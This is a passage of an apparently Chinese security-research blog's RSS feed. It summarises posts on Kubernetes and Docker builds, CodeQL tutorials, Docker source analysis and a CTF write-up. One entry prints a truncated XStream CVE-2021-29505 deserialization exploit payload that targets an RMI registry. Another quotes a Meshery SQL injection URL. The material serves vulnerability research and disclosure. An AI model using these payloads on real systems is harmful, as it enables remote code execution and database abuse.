      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8/k8s/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/How-to-Build-K8S.html</guid>
      <description>tags: container How to Build K8S  本文编写时，最新release为v1.22.4, 因此下文分析的代码均为v1.22.4分支的代码。  1. build 根据官方文档，一步一步来即可
1.下载代码
git clone https://github.com/kubernetes/kubernetes.git cd kubernetes git checkout v1.22.4 2.修改代码
sed -i &amp;quot;s/%s %s/%s %s modified by st0n3/g&amp;quot; staging/src/k8s.io/component-base/version/verflag/verflag.go 3.build: 默认会为所有模块编译出所有架构的代码，我们也可以指定编译的模块、架构。
./build/run.sh make kubelet KUBE_BUILD_PLATFORMS=linux/amd64 4.binary: 编译好的二进制文件位于./_output/dockerized/bin目录
# ./_output/dockerized/bin/linux/amd64/kubelet --version Kubernetes v1.22.4 modified by st0n3 2. advance 2.1 编译过程分析 上面我们执行的 run.sh 主要执行了3个步骤(编译构建环境、执行编译命令、复制编译好的文件)，这些步骤都是定义在common.sh中的函数。其中kube::build::run_build_command函数，直接接受外部输入，所以当我们执行run.sh make时，等同于执行kube::build::run_build_command make
https://github.com/kubernetes/kubernetes/blob/v1.22.4/build/run.sh#L39
source &amp;quot;$KUBE_ROOT/build/common.sh&amp;quot; ... kube::build::build_image ... kube::build::run_build_command &amp;quot;$@&amp;quot; ... kube::build::copy_output  分析kube::build::run_build_command()函数，发现传入的cmd参数，由docker run命令传入上面构建好的容器中，例如我们执行run.</description>
    </item>
    
    <item>
      <title>codeql入门指南</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html</link>
      <pubDate>Thu, 12 Aug 2021 11:10:09 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html</guid>
      <description>tags: codeql codeql入门指南 1. Intro 我是如何使用codeql挖掘CVE-2021-31856 Meshery sql注入的
2. codeql入门指南 2.1 工具安装  codeql cli 安装 codeql for vscode安装  2.2 about codeql language  QL tutorials  Find the thief Catch the fire starter Crown the rightful heir Cross the river    2.3 Codeql 语言关键概念介绍  逻辑语言: QL tutorials已经介绍，可以类比形式化验证、z3约束求解中的类似概念  QL 的语义基于 Datalog，这是一种声明式逻辑编程语言，通常用作查询语言 《Logic Programming and Databases》 在Codeql的招聘广告中我们可以看到codeql对于逻辑语言的需求   抽象语法树(Abstract Syntax Tree)  WIKIPEDIA: Abstract syntax tree Viewing the abstract syntax tree of a source file 强网杯-Qualifier-2021/web/pop_master writeup antlr   污点分析  Normal data flow vs taint tracking 强网杯-Qualifier-2021/web/pop_master writeup CTF 竞赛入门指南(CTF All In One):污点分析    2.</description>
    </item>
    
    <item>
      <title>强网杯-Qualifier-2021/web/pop_master writeup</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/web/php/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2021webpop_master-writeup.html</link>
      <pubDate>Fri, 06 Aug 2021 06:35:40 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/web/php/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2021webpop_master-writeup.html</guid>
      <description>强网杯-Qualifier-2021/web/pop_master writeup  题目内容：听说你是pop链构建大师？ http://eci-2ze1vm55dfrb5qc64x2n.cloudeci1.ichunqiu.com:80
 网站代码： 链接：https://pan.baidu.com/s/1fjfhdnmrO5xJ88SN5uNNMg 提取码：t97q
 class.php challenge.php  // wanglei: 一种基于ast的解法,可惜php没有codeql，否则就不用造一些轮子了 写了一个简易parser，会输出函数的有效调用关系（参数不会被修改的函数）。
&amp;lt;?php require &#39;vendor/autoload.php&#39;; use PhpParser\{Node, NodeFinder}; use PhpParser\Error; use PhpParser\ParserFactory; function WhetherAssignExprWillBeExecuted($method_node, $assign_expr) { $nodeFinder = new NodeFinder; $if_stmts = $nodeFinder-&amp;gt;findInstanceOf($method_node, Node\Stmt\If_::class); $contains = false; foreach ($if_stmts as $if_stmt) { $assign_exprs_in_if = $nodeFinder-&amp;gt;findInstanceOf($if_stmt, Node\Expr\Assign::class); foreach ($assign_exprs_in_if as $assign_expr_in_if) { if ($assign_expr_in_if == $assign_expr) { $contains = true; break; } } if ($contains == true) { if ($if_stmt-&amp;gt;cond instanceof Node\Expr\BinaryOp\Greater) { if ($if_stmt-&amp;gt;cond-&amp;gt;left-&amp;gt;value &amp;gt;= $if_stmt-&amp;gt;cond-&amp;gt;right-&amp;gt;value) { return true; // in if; execute } else { return false; // in if; not execute } } else { // TODO error_reporting(&amp;quot;cond is not greater&amp;quot;); exit(-1); } } } $for_stmts = $nodeFinder-&amp;gt;findInstanceOf($method_node, Node\Stmt\For_::class); $contains = false; foreach ($for_stmts as $for_stmt) { $assign_exprs_in_for = $nodeFinder-&amp;gt;findInstanceOf($for_stmt, Node\Expr\Assign::class); foreach ($assign_exprs_in_for as $assign_expr_in_for) { if ($assign_expr_in_for == $assign_expr) { $contains = true; break; } } if ($contains == true) { assert($for_stmt-&amp;gt;cond[0] instanceof Node\Expr\BinaryOp\Smaller); if ($for_stmt-&amp;gt;cond[0]-&amp;gt;right-&amp;gt;value &amp;gt; 0) { return true; } else { return false; } } } return true; } $classes = array(); $code = &amp;lt;&amp;lt;&amp;lt; &#39;code&#39; &amp;lt;?</description>
    </item>
    
    <item>
      <title>docker cli ConfigFile()源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-cli-ConfigFile%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Fri, 30 Jul 2021 03:36:52 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-cli-ConfigFile%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: container,源码分析 docker cli ConfigFile()源码分析 本文编写时，最新release为v20.10.7, 因此代码均为v20.10.7分支的代码
 在执行很多命令时，都需要读取docker cli的配置，即调用ConfigFile()，理解这个过程是有必要的。
https://github.com/docker/cli/blob/v20.10.7/cli/command/cli.go#L127
func (cli *DockerCli) ConfigFile() *configfile.ConfigFile { if cli.configFile == nil { cli.loadConfigFile() } return cli.configFile } func (cli *DockerCli) loadConfigFile() { cli.configFile = cliconfig.LoadDefaultConfigFile(cli.err) }  LoadDefaultConfigFile实现如下
https://github.com/docker/cli/blob/v20.10.7/cli/config/config.go#L151
func LoadDefaultConfigFile(stderr io.Writer) *configfile.ConfigFile { configFile, err := Load(Dir()) if err != nil { fmt.Fprintf(stderr, &amp;quot;WARNING: Error loading config file: %v\n&amp;quot;, err) } if printLegacyFileWarning { _, _ = fmt.Fprintln(stderr, &amp;quot;WARNING: Support for the legacy ~/.</description>
    </item>
    
    <item>
      <title>dockerfile使用COPY覆盖父镜像定义的volume</title>
      <link>/post/IT%E6%9D%82%E8%B4%A7%E9%93%BA/docker/dockerfile%E4%BD%BF%E7%94%A8COPY%E8%A6%86%E7%9B%96%E7%88%B6%E9%95%9C%E5%83%8F%E5%AE%9A%E4%B9%89%E7%9A%84volume.html</link>
      <pubDate>Thu, 22 Jul 2021 05:50:35 +0000</pubDate>
      
      <guid>/post/IT%E6%9D%82%E8%B4%A7%E9%93%BA/docker/dockerfile%E4%BD%BF%E7%94%A8COPY%E8%A6%86%E7%9B%96%E7%88%B6%E9%95%9C%E5%83%8F%E5%AE%9A%E4%B9%89%E7%9A%84volume.html</guid>
      <description>tags: container dockerfile使用COPY覆盖父镜像定义的volume 1. 问题: dockerfile中对父镜像的volume的修改，会被丢弃 以下dockerfile在父镜像A中定义了一个volume, 地址为/vol。在新编译的B镜像中，我们对/vol下的文件做了修改。我们想要这个修改可以保留在新编译的镜像B中，但实际却无法做到。
FROM alpine:3.14 AS A RUN mkdir &amp;quot;/vol&amp;quot; &amp;amp;&amp;amp; echo &amp;quot;FOO&amp;quot; &amp;gt; &amp;quot;/vol/data&amp;quot; VOLUME /vol FROM A AS B RUN sed -i s/FOO/BAR/g &amp;quot;/vol/data&amp;quot; &amp;amp;&amp;amp; cat /vol/data RUN cat /vol/data 编译上述dockerfile, 我们看到，在同一条RUN指令中，/vol/data的内容确实被修改成了BAR。但是，下一条RUN指令，/vol/data仍然是FOO。
Sending build context to Docker daemon 2.048kB Step 1/6 : FROM alpine:3.14 AS A ---&amp;gt; d4ff818577bc Step 2/6 : RUN mkdir &amp;quot;/vol&amp;quot; &amp;amp;&amp;amp; echo &amp;quot;FOO&amp;quot; &amp;gt; &amp;quot;/vol/data&amp;quot; ---&amp;gt; Running in c10987fe0acd Removing intermediate container c10987fe0acd ---&amp;gt; 8a7395e87d34 Step 3/6 : VOLUME /vol ---&amp;gt; Running in 611a152bd6ac Removing intermediate container 611a152bd6ac ---&amp;gt; 637ce773f44b Step 4/6 : FROM A AS B ---&amp;gt; 637ce773f44b Step 5/6 : RUN sed -i s/FOO/BAR/g &amp;quot;/vol/data&amp;quot; &amp;amp;&amp;amp; cat /vol/data ---&amp;gt; Running in ce1481fd1eb8 BAR Removing intermediate container ce1481fd1eb8 ---&amp;gt; 873b7801b7c2 Step 6/6 : RUN cat /vol/data ---&amp;gt; Running in bd0105a6d801 FOO Removing intermediate container bd0105a6d801 ---&amp;gt; e721c33e07ef Successfully built e721c33e07ef 2.</description>
    </item>
    
    <item>
      <title>codeql漏洞挖掘或分析模板</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E6%A8%A1%E6%9D%BF.html</link>
      <pubDate>Wed, 07 Jul 2021 08:32:24 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E6%A8%A1%E6%9D%BF.html</guid>
      <description> tags: codeql codeql漏洞挖掘或分析模板    item details note     Project Url     CVE-ID mitre url    LGTM Alert     Affect Version     Fix Version  fix commit   CVSS 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N    Author      一、codeql简介 二、项目简介 三、漏洞介绍 四、漏洞挖掘过程 介绍原始漏洞挖掘过程
五、query </description>
    </item>
    
    <item>
      <title>如何为docker(moby)项目创建codeql数据库</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/codeql/%E5%A6%82%E4%BD%95%E4%B8%BAdockermoby%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93.html</link>
      <pubDate>Wed, 30 Jun 2021 02:13:02 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/codeql/%E5%A6%82%E4%BD%95%E4%B8%BAdockermoby%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93.html</guid>
      <description>tags: codeql,container 如何为docker(moby)项目创建codeql数据库 1. 背景 lgtm上的数据库只提供了最新版本供下载，而且对moby项目创建的数据库可能是错误的。
https://lgtm.com/projects/g/moby/moby/logs/languages/lang:go
在build日志我们可以看到，lgtm的build方式和docker的官方build方式并不一致。 另外，对不同的运行环境，docker有不同的编译方式，包括deb,static等，可能一份数据库并不够。那么，如何正确地为docker(moby)项目编译codeql数据库呢？
[2021-06-29 07:19:26] [build-stderr] 2021/06/29 07:19:26 GOPATH set to /opt/src/root. [2021-06-29 07:19:26] [build-stderr] 2021/06/29 07:19:26 Makefile found. [2021-06-29 07:19:26] [build-stderr] 2021/06/29 07:19:26 Trying build command make [] [2021-06-29 07:19:26] [build-stdout] mkdir -p autogen [2021-06-29 07:19:26] [build-stderr] /bin/sh: 1: docker: not found [2021-06-29 07:19:26] [build-stderr] make: *** [Makefile:184: binary] Error 127 [2021-06-29 07:19:26] [build-stdout] docker build --build-arg=GO_VERSION -f &amp;quot;Dockerfile&amp;quot; --output=bundles/ --target=binary --build-arg VERSION --build-arg DOCKER_GITCOMMIT --build-arg PRODUCT --build-arg PLATFORM --build-arg DEFAULT_PRODUCT_LICENSE .</description>
    </item>
    
    <item>
      <title>我是如何使用codeql挖掘CVE-2021-31856Meshery sqli的</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8codeql%E6%8C%96%E6%8E%98CVE-2021-31856Meshery-sqli%E7%9A%84.html</link>
      <pubDate>Fri, 18 Jun 2021 10:06:08 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8codeql%E6%8C%96%E6%8E%98CVE-2021-31856Meshery-sqli%E7%9A%84.html</guid>
      <description>tags: codeql,cve 我是如何使用codeql挖掘CVE-2021-31856 Meshery sql注入的    item details     Project Url https://github.com/layer5io/meshery   CVE-ID CVE-2021-31856   LGTM Alert lgtm alert   Affect Version v0.5.2   Fix Version v0.5.3	fix commit   CVSS 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N   Author https://github.com/ssst0n3    一、codeql简介 CodeQL是一个自动化静态代码分析工具。在CodeQL中，代码被当作数据处理。安全漏洞、缺陷和其他错误被模拟成可以针对从代码中提取的数据库执行的查询。你可以运行由GitHub研究人员和社区贡献者编写的标准CodeQL查询，或者编写你自己的查询，用于自定义分析。找到潜在漏洞的查询会直接在源文件中突出显示结果。
二、meshery简介 Meshery是CNCF成员之一,作为服务网格管理平面，Meshery 支持任何服务网格及其工作负载的采用、操作和管理。
三、CVE-2021-31856介绍 简介如下：
GetMesheryPatterns() 函数(位于meshery/models/meshery_pattern_persister.go)存在一个SQL注入漏洞，注入点是/api/experimental/patternfile?order=id%3Bselect(randomblob(1000000000))&amp;amp;page=0&amp;amp;page_size=0中的order参数。
具体内容已在另外的文章中详细介绍，参见：
 中文版本 english version  四、挖掘过程 前段时间，我在学习codeql时，想找一些案例。于是在lgtm上翻了一下, 偶然间发现了Meshery中的一个sql注入漏洞。</description>
    </item>
    
    <item>
      <title>docker-tar,docker-untar源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-tardocker-untar%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Tue, 01 Jun 2021 08:59:53 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-tardocker-untar%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: 源码分析,container docker-tar,docker-untar源码分析 本文编写时，最新release为v20.10.6, 因此代码均为v20.10.6分支的代码
1. 简介 docker-tar和docker-untar是dockerd的两个“子命令”，是docker cp命令在容器内的延伸，分别提供在容器内打包、解包的能力。
2. 使用 2.1 代码使用 参考 docker reexec源码分析。
2.2 二进制使用 除了通过以类似fork的形式在代码中使用，docker-tar也可以通过二进制的形式使用，但这种形式不常见。这种使用方式的价值在于能方便得直接进入docker-tar的逻辑，在分析docker-tar实现、或研究相关的安全问题时，比较方便、直观。
将dockerd复制一份，得到docker-tar的二进制文件，两者使用相同的二进制文件，通过执行时的不同的cmdline，进入不同的代码逻辑。
cp /usr/bin/dockerd /usr/bin/docker-tar docker-tar的stdin是json格式的配置选项，arg1是需要打包的路径，arg2是chroot的目录，stdout会输出打包好的文件。
echo &amp;quot;{}&amp;quot; &amp;gt; /tmp/json mkdir /tmp/test cp /etc/hosts /tmp/test/ docker-tar &amp;lt; /tmp/json /test/hosts /tmp/ &amp;gt; /tmp/test.tar docker-tar具体接收的配置选项参见： https://github.com/moby/moby/blob/v20.10.6/pkg/archive/archive.go#L37
TarOptions struct { IncludeFiles []string ExcludePatterns []string Compression Compression NoLchown bool UIDMaps []idtools.IDMap GIDMaps []idtools.IDMap ChownOpts *idtools.Identity IncludeSourceDir bool // WhiteoutFormat is the expected on disk format for whiteout files.</description>
    </item>
    
    <item>
      <title>XStream CVE-2021-29505 poc修正</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html</link>
      <pubDate>Mon, 24 May 2021 03:32:41 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html</guid>
      <description>tags: 漏洞分析 XStream CVE-2021-29505 poc修正 官网给出的poc很怪异，无法直接跑。
https://x-stream.github.io/CVE-2021-29505.html
1. 正确poc &amp;lt;java.util.PriorityQueue serialization=&#39;custom&#39;&amp;gt; &amp;lt;unserializable-parents/&amp;gt; &amp;lt;java.util.PriorityQueue&amp;gt; &amp;lt;default&amp;gt; &amp;lt;size&amp;gt;2&amp;lt;/size&amp;gt; &amp;lt;/default&amp;gt; &amp;lt;int&amp;gt;3&amp;lt;/int&amp;gt; &amp;lt;javax.naming.ldap.Rdn_-RdnEntry&amp;gt; &amp;lt;type&amp;gt;12345&amp;lt;/type&amp;gt; &amp;lt;value class=&#39;com.sun.org.apache.xpath.internal.objects.XString&#39;&amp;gt; &amp;lt;m__obj class=&#39;string&#39;&amp;gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none&amp;lt;/m__obj&amp;gt; &amp;lt;/value&amp;gt; &amp;lt;/javax.naming.ldap.Rdn_-RdnEntry&amp;gt; &amp;lt;javax.naming.ldap.Rdn_-RdnEntry&amp;gt; &amp;lt;type&amp;gt;12345&amp;lt;/type&amp;gt; &amp;lt;value class=&#39;com.sun.xml.internal.ws.api.message.Packet&#39; serialization=&#39;custom&#39;&amp;gt; &amp;lt;message class=&#39;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#39;&amp;gt; &amp;lt;parsedMessage&amp;gt;true&amp;lt;/parsedMessage&amp;gt; &amp;lt;soapVersion&amp;gt;SOAP_11&amp;lt;/soapVersion&amp;gt; &amp;lt;bodyParts/&amp;gt; &amp;lt;sm class=&#39;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#39;&amp;gt; &amp;lt;attachmentsInitialized&amp;gt;false&amp;lt;/attachmentsInitialized&amp;gt; &amp;lt;multiPart class=&#39;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#39;&amp;gt; &amp;lt;soapPart/&amp;gt; &amp;lt;mm&amp;gt; &amp;lt;it class=&#39;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#39;&amp;gt; &amp;lt;aliases class=&#39;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#39;&amp;gt; &amp;lt;candidates class=&#39;com.sun.jndi.rmi.registry.BindingEnumeration&#39;&amp;gt; &amp;lt;names&amp;gt; &amp;lt;string&amp;gt;aa&amp;lt;/string&amp;gt; &amp;lt;string&amp;gt;aa&amp;lt;/string&amp;gt; &amp;lt;/names&amp;gt; &amp;lt;ctx&amp;gt; &amp;lt;environment/&amp;gt; &amp;lt;registry class=&#39;sun.rmi.registry.RegistryImpl_Stub&#39; serialization=&#39;custom&#39;&amp;gt; &amp;lt;java.rmi.server.RemoteObject&amp;gt; &amp;lt;string&amp;gt;UnicastRef&amp;lt;/string&amp;gt; &amp;lt;string&amp;gt;127.0.0.1&amp;lt;/string&amp;gt; &amp;lt;int&amp;gt;2333&amp;lt;/int&amp;gt; &amp;lt;long&amp;gt;0&amp;lt;/long&amp;gt; &amp;lt;int&amp;gt;0&amp;lt;/int&amp;gt; &amp;lt;long&amp;gt;0&amp;lt;/long&amp;gt; &amp;lt;short&amp;gt;0&amp;lt;/short&amp;gt; &amp;lt;boolean&amp;gt;false&amp;lt;/boolean&amp;gt; &amp;lt;/java.rmi.server.RemoteObject&amp;gt; &amp;lt;/registry&amp;gt; &amp;lt;host&amp;gt;127.</description>
    </item>
    
    <item>
      <title>docker本地开发环境搭建</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/docker%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</link>
      <pubDate>Thu, 20 May 2021 09:29:12 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/docker%E6%9C%AC%E5%9C%B0%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</guid>
      <description> tags: container docker本地开发环境搭建  git仓库: https://github.com/moby/moby IDE: GoLand 依赖环境: linux,golang    fork代码
推荐fork一份代码，而不是直接使用官方仓库，方便后续build代码 参考 https://github.com/moby/moby/blob/master/docs/contributing/set-up-git.md
  下载代码
git clone https://github.com/moby/moby.git   将代码移动到GoSrc,并将路径中的moby/moby替换为docker/docker
mkdir -p $GOPATH/src/github.com/docker cp moby $GOPATH/src/github.com/docker/docker -r   使用IDE打开即可   修改代码，push
  clone修改的代码，然后build
  问题澄清 为什么不用go mod下载的代码  gomod仅下载tags下的代码，遗失很多commits细节 gomod不下载github.com/moby/moby/vendor下的代码，这会导致很多代码不一致（即moby/vendor中的代码不一定与gosrc下的代码一致,例如archive）  </description>
    </item>
    
    <item>
      <title>how to build docker</title>
